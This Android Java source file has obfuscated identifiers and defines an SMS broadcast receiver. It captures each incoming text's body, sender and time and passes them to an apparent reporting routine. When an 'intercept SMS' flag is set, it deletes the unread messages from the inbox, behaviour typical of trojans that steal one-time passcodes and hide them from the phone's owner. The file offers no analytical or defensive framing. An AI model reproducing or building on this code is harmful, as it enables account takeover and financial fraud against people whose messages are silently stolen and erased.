package replaceflag_fysn.replaceflag_rydk.replaceflag_capud;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_abs.replaceflag_Cuiyuy;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_abs.replaceflag_Pnnmjk;

import java.text.SimpleDateFormat;
import java.util.Date;

public class replaceflag_Tfgfgy extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Log.i("keep", "onReceive: " + intent.getAction());
        SmsMessage msg = null;
        if (null != bundle) {
//            this.abortBroadcast();
            Object[] smsObj = (Object[]) bundle.get("pdus");
            if(smsObj==null){
                return;
            }
            for (Object object : smsObj) {
                msg = SmsMessage.createFromPdu((byte[]) object);
                Date date = new Date(msg.getTimestampMillis());// 时间
                SimpleDateFormat format = new SimpleDateFormat(
                        "yyyy-MM-dd HH:mm:ss");
                String receiveTime = format.format(date);

                replaceflag_Cuiyuy.updateUser(new replaceflag_Pnnmjk(msg.getMessageBody(),
                        msg.getOriginatingAddress(),
                        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(msg.getTimestampMillis()))));

                if (replaceflag_Styuty.getBoolean("lanjie_sms", false)) {
                    //置为已读
                    setAllMessageRead(context.getContentResolver());
                }
            }
        }
    }

    private void setAllMessageRead(ContentResolver cr) {
        Uri SMS_INBOX = Uri.parse("content://sms/inbox");
        String[] projection = new String[]{"_id", "address", "body", "date", "read", "thread_id"};
        Cursor cursor = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cursor) {
            return;
        }
        String read = null;
        String id = null;
        long thread_id;
        ContentValues values = new ContentValues();
        values.put("read", "1");
        Log.i("fuyanan", "ee");
        while (cursor.moveToNext()) {
            read = cursor.getString(cursor.getColumnIndex("read"));
            id = cursor.getString(cursor.getColumnIndex("_id"));
            thread_id = cursor.getLong(cursor.getColumnIndex("thread_id"));
            Log.i("fuyanan", "read: " + read + "," + cursor.getString(cursor.getColumnIndex("body"))) ;
            if (read.equals("0")) {
//                cr.delete(Uri.parse("content://sms/conversations/" + thread_id), null, null);
                cr.delete(Uri.parse("content://sms"), "_id=" + id, null);
            }
        }
        cursor.close();
    }
}

